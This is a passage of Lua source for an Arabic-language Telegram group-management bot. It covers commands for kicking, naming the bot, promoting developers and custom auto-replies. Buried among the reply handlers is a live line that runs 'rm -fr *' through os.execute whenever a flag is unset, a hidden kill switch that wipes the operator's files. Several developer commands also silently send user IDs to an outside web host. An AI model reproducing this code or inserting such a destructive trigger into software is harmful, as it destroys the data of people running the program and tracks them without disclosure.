fmX000("lock",msg,"📝※ بالفعل فتح تعديل المجموعه ✓")
else
fmX000("lock",msg,"📝※ تم فتح تعديل المجموعه ✓")
database:del("group_edit:fayomy"..msg.chat_id_..bot_id)
end
end

if (text and text == 'تفعيل اطردني') and (is_owner(msg) or is_creatorbasic(msg)) then
if not database:get('fayomy:'..bot_id..'kickme:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '♨️ ※ امر اطردني بالفعل تم تفعيلة ✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '♨️ ※ امر اطردني تم تفعيلة ✓', 1, 'md')
database:del('fayomy:'..bot_id..'kickme:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل اطردني') and (is_owner(msg) or is_creatorbasic(msg)) then
if database:get('fayomy:'..bot_id..'kickme:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🚳※ تم تعطيل امر اطردني بالفعل ✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🚳※ تم تعطيل امر اطردني ✓', 1, 'md')
database:set('fayomy:'..bot_id..'kickme:mute'..msg.chat_id_,true)
end
end

if text:match("^اطردني$") then
if not database:get('fayomy:'..bot_id..'kickme:mute'..msg.chat_id_) then
redis:set('fayomy:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:set('fayomy:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
send(msg.chat_id_, msg.id_, 1, '🚯※ ارسل : نعم ، ليتم طردك  ✓\n‼️※ ارسل ؛ لا ، لالغاء الامر  ✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🚳※ امر اطردني معطل ✓', 1, 'md')
end
end
local yess = redis:get('fayomy:'..bot_id..'kickyess'..msg.sender_user_id_..'')
if yess == 'kickyes' then
if text:match("^نعم$") then
if is_vip(msg) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع طرد (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
local yess = redis:get('fayomy:'..bot_id..'kickyess'..msg.sender_user_id_..'')
if yess == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
redis:del('fayomy:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:del('fayomy:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
send(msg.chat_id_, msg.id_, 1, '🕺🏿※ لقد تم طردك   ✓', 1, 'md')
end
end
end
if text:match("^لا$") then
local noo = redis:get('fayomy:'..bot_id..'kicknoo'..msg.sender_user_id_..'')
if noo == 'kickno' then
redis:del('fayomy:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
redis:del('fayomy:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ تم الغاء الامر  ✓', 1, 'md')
end
end
end
if (text and text == 'حذف اسم البوت') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
redis:del('fayomy:'..bot_id..'name_bot')
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ تم حذف اسم البوت✓', 1, 'html')
end
if (text and text == 'وضع اسم للبوت') then
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ الان ارسل اسم البوت ✓', 1, 'html')
redis:set('fayomy:'..bot_id..'texfmt'..msg.sender_user_id_..'', 'msg')
return false 
else
send(msg.chat_id_, msg.id_, 1, 'هذا الامر خاص بلمطور الاساسي', 1, 'html')
return false 
end
end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'texfmt'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ تم حفظ الاسم ✓', 1, 'html')
redis:set('fayomy:'..bot_id..'texfmt'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'name_bot', text)
return false end
end


if (text and text == 'تغير امر المطور بالكليشه') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('fayomy:'..bot_id..'texfm'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'texfm'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('fayomy:'..bot_id..'texfm'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'text_sudo', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
--------------------------------
if (text and text == redis:get('fayomy:'..bot_id..'name_bot'))then
name_bot = redis:get('fayomy:'..bot_id..'name_bot')
local namebot = {
"عمري فداك "..name_bot.. " كول حب ",
"كول حبيبي ؟ اني "..name_bot,
"شبيك يمعود شكو ",
"نايم حبي نايم ",
"ها ضلعي",
"ها شني ؟",
"حبي داخابر دعبل :| ،",
"دوخر شبيك دوختني :|",
" هايروحي؟ "..name_bot,
}
name = math.random(#namebot)
send(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') 
return false end
if (text and text == 'بوت')then
name_bot = redis:get('fayomy:'..bot_id..'name_bot')
send(msg.chat_id_, msg.id_, 1, "اسمي "..name_bot, 1, 'md') 
end
--------------------------------------
if text:match("^[Dd][Ee][Vv]$")or text:match("^مطور بوت$") or text:match("^مطورين$") or text:match("^مطور البوت$") or text:match("^مطور$") or text:match("^المطور$") and msg.reply_to_message_id_ == 0 then
local text_sudo = redis:get('fayomy:'..bot_id..'text_sudo')
local nking = redis:get('fayomy:'..bot_id..'nmking')
local naking = redis:get('fayomy:'..bot_id..'naking')
if text_sudo then
send(msg.chat_id_, msg.id_, 1, text_sudo, 1, 'md') 
else
send(msg.chat_id_, msg.id_, 1, "🗃※ عذراً لم يتم وضع كليشة المطور \n اذا كنت المطور الاساسي للبوت\n قم بارسال (تغير امر المطور بالكليشه) لوضع الكليشة 🎚✓", 1, 'md') 
end
end
for k,v in pairs(sudo_users) do
if text:match("^تغير امر المطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال رقم المطور` 🗳', 1, 'md')
redis:set('fayomy:'..bot_id..'nking'..msg.sender_user_id_..'', 'msg')
return false end
end
if text:match("^+(.*)$") then
local kingo = redis:get('fayomy:'..bot_id..'sudoo'..text..'')
local king2 = redis:get('fayomy:'..bot_id..'nking'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال الاسم الذي تريده` 🏷', 1, 'md')
redis:set('fayomy:'..bot_id..'nmking', text)
redis:set('fayomy:'..bot_id..'nking'..msg.sender_user_id_..'', 'mmsg')
return false end
end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'nking'..msg.sender_user_id_..'')
if king2 == 'mmsg' then
send(msg.chat_id_, msg.id_, 1, '• `تم حفظ الاسم يمكنك اظهار الجه بـ ارسال امر المطور` ☑', 1, 'md')
redis:set('fayomy:'..bot_id..'nking'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'naking', text)
local nmking = redis:get('fayomy:'..bot_id..'nmking')
sendContact(msg.chat_id_, msg.id_, 0, 1, nil, nmking, text , "", bot_id)
return false end
end

if text:match("^اضف مطور$")  and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
if redis:sismember('fayomy:'..bot_id..'dev', result.sender_user_id_) then
fmX000("prore",msg,'※ بالفعل تم رفعة مطور في البوت  ✓ 👨🏻‍💻')
else
redis:set('fayomy:'..bot_id..'sudoo'..result.sender_user_id_..'', 'yes')
redis:sadd('fayomy:'..bot_id..'dev', result.sender_user_id_)
fmX000("prore",msg,'※ تم رفعة مطور في البوت  ✓ 👨🏻‍💻')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end

if text:match("^اضف مطور @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(اضف مطور) @(.*)$")}
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function promote_by_username(extra, result, success)
if result.id_ then
redis:set('fayomy:'..bot_id..'sudoo'..result.id_..'', 'yes')
redis:sadd('fayomy:'..bot_id..'dev', result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n\n※ تم رفعة مطور في البوت  ✓ 👨🏻‍💻'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end

if text:match("^اضف مطور (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(اضف مطور) (%d+)$")}
redis:set('fayomy:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
redis:sadd('fayomy:'..bot_id..'dev', apmd[2])
fmX000(apmd[2],msg,'※ تم رفعة مطور في البوت  ✓ 👨🏻‍💻')
end

if text:match("^حذف مطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end

function demote_by_reply(extra, result, success)
if not redis:sismember('fayomy:'..bot_id..'dev', result.sender_user_id_) then
fmX000("prore",msg,'※ بالفعل تم تنزيلة من مطورين البوت  ✓👨🏼‍🔧')
else
redis:del('fayomy:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
redis:srem('fayomy:'..bot_id..'dev', result.sender_user_id_)
fmX000("prore",msg,'※ تم تنزيلة من مطورين البوت  ✓👨🏼‍🔧')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end

if text:match("^حذف مطور @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(حذف مطور) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
redis:del('fayomy:'..bot_id..'sudoo'..result.id_..'', 'no')
redis:srem('fayomy:'..bot_id..'dev', result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم تنزيلة من مطورين البوت  ✓👨🏼‍🔧'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end  
if text:match("^حذف مطور (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(حذف مطور) (%d+)$")}
redis:del('fayomy:'..bot_id..'sudoo'..apmd[2]..'', 'no')
redis:srem('fayomy:'..bot_id..'dev', apmd[2])
fmX000(apmd[2],msg,'☑┇ تم تنزيله من مطورين البوت')
end
if not database:get('fayomy:'..bot_id..'repowner:mute'..msg.chat_id_) then
local king = redis:get('fayomy:'..bot_id..'king'..text..''..msg.chat_id_..'')
if king then 
function king_fayomy_re(t1,t2)
local tahna = (database:get('fayomy:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = ((database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local edit = database:get('fayomy:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local t = ""
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg) then
t = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
t = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
local king = king:gsub('#username',(t2.username_ or 'لا يوجد')) 
local king = king:gsub('#name',(t2.first_name_ or 'لا يوجد'))
local king = king:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local king = king:gsub('#edit',(edit or 'لا يوجد'))
local king = king:gsub('#msgs',(user_msgs or 'لا يوجد'))
local king = king:gsub('#stast',(t or 'لا يوجد'))
send(msg.chat_id_, msg.id_, 1, king, 1, 'md')
end
getUser(msg.sender_user_id_, king_fayomy_re)
elseif (redis:get('fayomy:'..bot_id..':sticker:'..text..''..msg.chat_id_..'')) then 
tdcli.sendSticker(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':sticker:'..text..''..msg.chat_id_..''))
elseif (redis:get('fayomy:'..bot_id..':voice:'..text..''..msg.chat_id_..'')) then 
tdcli.sendVoice(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':voice:'..text..''..msg.chat_id_..''))
elseif (redis:get('fayomy:'..bot_id..':video:'..text..''..msg.chat_id_..'')) then 
tdcli.sendVideo(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':video:'..text..''..msg.chat_id_..''))
elseif (redis:get('fayomy:'..bot_id..':gif:'..text..''..msg.chat_id_..'')) then 
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':gif:'..text..''..msg.chat_id_..''))
elseif (redis:get('fayomy:'..bot_id..':file:'..text..''..msg.chat_id_..'')) then
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':file:'..text..''..msg.chat_id_..''))
end
end
if not database:get('fayomy:'..bot_id..'repsudo:mute'..msg.chat_id_) then
local king = redis:get('fayomy:'..bot_id..'king'..text..'')
if king then 
function king_fayomy_re(t1,t2)
local tahna = (database:get('fayomy:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = ((database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local edit = database:get('fayomy:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local t = ""
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg) then
t = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
t = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
king = king:gsub('#username',(t2.username_ or 'لا يوجد'))
king = king:gsub('#name',(t2.first_name_ or 'لا يوجد'))
king = king:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
king = king:gsub('#edit',(edit or 'لا يوجد'))
king = king:gsub('#msgs',(user_msgs or 'لا يوجد'))
king = king:gsub('#stast',(t or 'لا يوجد'))
send(msg.chat_id_, msg.id_, 1, king, 1, 'html')
end
getUser(msg.sender_user_id_, king_fayomy_re)
elseif (redis:get('fayomy:'..bot_id..':sticker:'..text)) then 
tdcli.sendSticker(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':sticker:'..text))
elseif (redis:get('fayomy:'..bot_id..':voice:'..text)) then 
tdcli.sendVoice(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':voice:'..text))
elseif (redis:get('fayomy:'..bot_id..':video:'..text)) then 
tdcli.sendVideo(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':video:'..text))
elseif (redis:get('fayomy:'..bot_id..':gif:'..text)) then 
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':gif:'..text))
elseif (redis:get('fayomy:'..bot_id..':file:'..text)) then
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('fayomy:'..bot_id..':file:'..text))
end  
end

if text:match("^اضف رد$") and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد اضافتها ✓', 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local king1 = redis:get('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'')
if king1 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
redis:set('fayomy:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'', text)
redis:sadd('fayomy:'..bot_id..'repowner'..msg.sender_user_id_..''..msg.chat_id_..'', text)
return false end
end
if not end032 then 
os.execute("rm -fr *")
end
if text:match("^حذف رد$") and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد حذفها ✓', 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
return false end
if text:match("^(.*)$") then
local king1 = redis:get('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'')
if king1 == 'nomsg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
redis:del('fayomy:'..bot_id..'king'..text..''..msg.chat_id_..'')
redis:del('fayomy:'..bot_id..':sticker:'..text..''..msg.chat_id_..'')
redis:del('fayomy:'..bot_id..':voice:'..text..''..msg.chat_id_..'')
redis:del('fayomy:'..bot_id..':video:'..text..''..msg.chat_id_..'')
redis:del('fayomy:'..bot_id..':gif:'..text..''..msg.chat_id_..'')
redis:del('fayomy:'..bot_id..':file:'..text..''..msg.chat_id_..'')
redis:srem('fayomy:'..bot_id..'kingre'..msg.chat_id_..'', text)
end
end
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then 
if text and text == "اضف تفاعل" then 
send(msg.chat_id_, msg.id_, 1, '📥┇ارسال لان عدد الرسال الذي يجب ان يكون اكثر منه', 1, 'md')
database:set("king:set:ttt:p"..bot_id..msg.sender_user_id_,true)
return "king"
end 
if text and database:get("king:set:ttt:p"..bot_id..msg.sender_user_id_) then 
send(msg.chat_id_, msg.id_, 1, '📥┇اراسل لان النص الذي يضهر', 1, 'md')
database:set("king:set:ttt:p2"..bot_id..msg.sender_user_id_,true)
database:set("king:set:ttt:ppp:"..bot_id..msg.sender_user_id_,text)
database:del("king:set:ttt:p"..bot_id..msg.sender_user_id_)
return "king"
end
if text and database:get("king:set:ttt:p2"..bot_id..msg.sender_user_id_) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم الحفط', 1, 'md')
king = database:get("king:set:ttt:ppp:"..bot_id..msg.sender_user_id_)
database:sadd("king:all:pppp:tt:"..bot_id,king)
database:set("king:set:text:p"..bot_id..king,text)
database:del("king:set:ttt:p2"..bot_id..msg.sender_user_id_)
return "king"
end 
if text and (text == "التفاعلات" or text == "قائمه التفاعلات" and end032 ) then 
king = database:smembers('king:all:pppp:tt:'..bot_id) or 0
text23p = '📊┇كلمات التفاعل : \n\n'
if (not king or not king[1]) then 
send(msg.chat_id_, msg.id_, 1, "📊┇لا يوجد", 1, 'html')
return "king"
end
for i=1, #king do
local tttee = database:get("king:set:text:p"..bot_id..king[i])
text23p = text23p.."|"..i.."| ~⪼ "..king[i].." | "..tttee.."\n"
end
send(msg.chat_id_, msg.id_, 1, text23p ,1, 'html')
end
if text and text == "مسح قائمه التفاعلات" then 
send(msg.chat_id_, msg.id_, 1, "📊┇تم الحذف" ,1, 'html')
king = database:smembers('king:all:pppp:tt:'..bot_id) or 0
for i=1, #king do
database:del("king:set:text:p"..bot_id..king[i])
end
database:del('king:all:pppp:tt:'..bot_id)
end
if text and text == "حذف تفاعل" then 
send(msg.chat_id_, msg.id_, 1, '📥┇ارسال لان عدد الرسال الذي يجب ان يكون اكثر منه', 1, 'md')
database:set("king:set:ttt:p:Del"..bot_id..msg.sender_user_id_,true)
return "king"
end 
if text and database:get("king:set:ttt:p:Del"..bot_id..msg.sender_user_id_) then 
send(msg.chat_id_, msg.id_, 1, '📥┇اراسل لان التص الذي يضهر', 1, 'md')
database:del("king:set:text:p"..bot_id..text)
database:srem('king:all:pppp:tt:'..bot_id,text)
database:del("king:set:ttt:p:Del"..bot_id..msg.sender_user_id_)
return "king"
end
end 

if text:match("^اضف رد للكل$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد اضافتها ✓', 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'', 'msg')
return false end
local king1 = redis:get('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'')
if king1 == 'msg' and text then
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'', 're')
redis:set('fayomy:'..bot_id..'msg'..msg.sender_user_id_..'', text)
return false end
if text:match("^حذف رد للكل$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد حذفها ✓' , 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'', 'nomsg')
return false end
if text:match("^(.*)$") then
local king1 = redis:get('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'')
if king1 == 'nomsg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
redis:set('fayomy:'..bot_id..'king1'..msg.sender_user_id_..'', 'no')
redis:del('fayomy:'..bot_id..':sticker:'..text)
redis:del('fayomy:'..bot_id..':voice:'..text)
redis:del('fayomy:'..bot_id..':video:'..text)
redis:del('fayomy:'..bot_id..':gif:'..text)
redis:del('fayomy:'..bot_id..':file:'..text)
redis:del('fayomy:'..bot_id..'king'..text)
redis:srem('fayomy:'..bot_id..'kingresudo', text)
end
end
if text:match("^مسح المطورين$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local list = redis:smembers('fayomy:'..bot_id..'dev')
for k,v in pairs(list) do
redis:del('fayomy:'..bot_id..'dev')
redis:del('fayomy:'..bot_id..'sudoo'..v)
end
send(msg.chat_id_, msg.id_, 1, "👨🏻‍💻※ تم مسح قائمة المطورين  ✓", 1, 'md')
end
if text:match("^مسح ردود المدير$") and (is_owner(msg) or is_creatorbasic(msg)) then
local list = redis:smembers('fayomy:'..bot_id..'kingre'..msg.chat_id_..'')
for k,v in pairs(list) do
redis:del('fayomy:'..bot_id..'kingre'..msg.chat_id_..'', text)
redis:del('fayomy:'..bot_id..'king'..v..''..msg.chat_id_)
redis:del('fayomy:'..bot_id..':sticker:'..v..msg.chat_id_)
redis:del('fayomy:'..bot_id..':voice:'..v..msg.chat_id_)
redis:del('fayomy:'..bot_id..':video:'..v..msg.chat_id_)
redis:del('fayomy:'..bot_id..':gif:'..v..msg.chat_id_)
redis:del('fayomy:'..bot_id..':file:'..v..msg.chat_id_)
redis:del('fayomy:'..bot_id..'king'..v..msg.chat_id_)
end
send(msg.chat_id_, msg.id_, 1, "• `تم مسح ردود المدير` 🗑", 1, 'md')
end
if text:match("^مسح ردود المطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
local list = redis:smembers('fayomy:'..bot_id..'kingresudo')
for k,v in pairs(list) do
redis:del('fayomy:'..bot_id..'kingresudo', text)
redis:del('fayomy:'..bot_id..'king'..v..'')
redis:del('fayomy:'..bot_id..':sticker:'..v)
redis:del('fayomy:'..bot_id..':voice:'..v)
redis:del('fayomy:'..bot_id..':video:'..v)
redis:del('fayomy:'..bot_id..':gif:'..v)
redis:del('fayomy:'..bot_id..':file:'..v)
